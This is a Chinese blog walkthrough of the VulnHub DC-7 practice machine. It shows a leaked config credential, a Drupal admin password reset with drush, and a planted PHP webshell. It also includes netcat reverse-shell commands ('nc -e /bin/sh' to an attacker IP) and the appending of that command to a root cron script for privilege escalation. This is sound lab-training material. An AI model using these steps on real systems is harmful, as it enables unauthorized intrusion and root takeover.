---
title: DC-7复现
permalink: /archives/54139/
published: 2022-12-01 09:13:00
tags: 
  - vulnhub
  - 渗透测试
category: 靶场&靶机
---
# DC-7复现

## 描述

> DC-7是另一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。
>
> 虽然这不是一个过于技术性的挑战，但它并不容易。
>
> 虽然这是早期DC版本的逻辑进展（我不会告诉你是哪一个），但涉及一些新概念，但你需要自己弄清楚这些概念。:-)如果您需要诉诸暴力破解或字典攻击，您可能不会成功。
>
> 你需要做的，是“跳出框框”思考。
>
> 哇 盒子的“外面”。:-)
>
> 这个挑战的最终目标是获得根并阅读唯一的标志。
>
> Linux 技能和对 Linux 命令行的熟悉是必须的，对基本渗透测试工具的一些经验也是必须的。
>
> 对于初学者来说，谷歌可以提供很大的帮助，但你总是可以在@DCAU7发推文给我寻求帮助，让你再次前进。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。

## 信息收集

确定目标的**IP**，以及开放的端口

`nmap 192.168.71.0/24`

![image-20221201092525322](./images/image-20221201092525322.png)

访问80端口上的服务

![image-20221201093011739](./images/image-20221201093011739.png)

机翻

![image-20221201093141461](./images/image-20221201093141461.png)

根据这个提示，说不是技术性的问题，那就有可能是找线索，然后可以发现在脚标处有一个@DC7USER，用谷歌搜索进到了他的GitHub主页，在他的staffdb仓库中的config.php里发现了一个账号和密码，还有数据库的名字

```php
<?php
	$servername = "localhost";
	$username = "dc7user";
	$password = "MdR3xOgB7#dW";
	$dbname = "Staff";
	$conn = mysqli_connect($servername, $username, $password, $dbname);
?>
```

![image-20221201093608772](./images/image-20221201093608772.png)

## 漏洞利用

### 账号密码泄露利用

直接在网页登录，是失败的

![image-20221201093747135](./images/image-20221201093747135.png)

那就换一个思路，我们最开始扫描机器的时候，发现其开启了22端口，那就尝试ssh登录

```bash
ssh dc7user@192.168.71.129
```

登录成功

![image-20221201094354750](./images/image-20221201094354750.png)

在当前目录下，发现了两个文件夹**backups**和**mbox**，其中backups是有两个gpg结尾的文件，经过查阅得知这是一种加密文件的后缀；在mbox里记录着root的定时任务，其项目位于 `/opt/scripts/backups.sh`

![image-20221201095704000](./images/image-20221201095704000.png)

查看**backups.sh**里的内容

![image-20221201095822202](./images/image-20221201095822202.png)

因为是一个shell脚本，那就看是否够权限写入，并执行进行反弹shell

`ls -l`

发现并没有权限

![image-20221201100418322](./images/image-20221201100418322.png)

### drush修改密码

在**backups.sh**里，我们看到了**drush**命令，进行简单的了解后发现可以利用

drush部分命令：

```txt
查看用户信息
drush user-information admin	//查询是否存在admin
修改密码
drush upwd admin --password="1234"		//修改admin密码为1234
```

存在admin用户

![image-20221201101409140](./images/image-20221201101409140.png)

admin密码修改成功

![image-20221201101440524](./images/image-20221201101440524.png)

成功登录

![image-20221201101512704](./images/image-20221201101512704.png)

### 反弹shell

这个站的cms是Drupal8，它是不支持php代码的，需要添加模块

<!-- ![image-20221201101820426](C:\Users\alpha\AppData\Roaming\Typora\typora-user-images\image-20221201101820426.png) -->

位置：**manage**->**extend**->**install new module**

可以选者在**intsall from a url**里面填入下载地址进行安装，也可以下载之后选择**Upload a module or theme archive to install**导入安装，我因为url导入不成功，就用上传的方式

下载地址：

```txt
https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz
```

![image-20221201102310752](./images/image-20221201102310752.png)

回退到Extend界面进行安装

![image-20221201102628741](./images/image-20221201102628741.png)

然后进到content界面直接修改随便一个文件，写入一句话木马

![image-20221201102938629](./images/image-20221201102938629.png)

连接成功，利用蚁剑的虚拟终端进行反弹shell

![image-20221201103452414](./images/image-20221201103452414.png)

```
nc -lvvp 1234	//在攻击机上执行
nc -e /bin/sh 192.168.71.128 1234	//在受害机上执行
python -c 'import pty; pty.spawn("/bin/bash")'	//交互式shell
```

![image-20221201103751736](./images/image-20221201103751736.png)

## 提权

之前的提权方式都用不了，就只能换个思路，前面提到想用**backups.sh**进行反弹shell，发现www-data用户是有写入的权限的，那就同理利用其进行提权

可以直接在蚁剑里找到backups.sh直接加上 `nc -e /bin/sh 192.168.71.128 1234`

![image-20221201144758579](./images/image-20221201144758579.png)

也可以利用echo进行写入

```bash
echo 'nc -e /bin/sh 192.168.71.128 1234'>>/opt/scripts/backups.sh
```

```bash
cd ~
cat theflag.txt
```

## flag

![image-20221201144633041](./images/image-20221201144633041.png)
